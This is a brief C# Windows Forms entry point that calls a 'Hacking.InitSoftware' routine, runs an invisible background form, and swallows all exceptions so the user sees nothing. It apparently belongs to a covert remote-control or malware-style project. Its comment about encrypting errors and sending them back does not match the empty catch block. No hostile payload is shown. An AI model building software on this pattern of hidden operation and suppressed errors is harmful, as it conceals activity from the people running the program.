using System;
using System.Windows.Forms;
using Main.Tools;

namespace Main
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Don't show any exception to the user
            try
            {
                Hacking.InitSoftware(Config.StartMode, args.Length == 1 ? args[0] : null);
                // ReSharper disable once ObjectCreationAsStatement
                // The Form has to run in the background
                new FormBackground();
                Application.Run();
            }
            // Log the exception, encrypt it and send it back
            catch
            {
                // ignored
            }
        }
    }
}
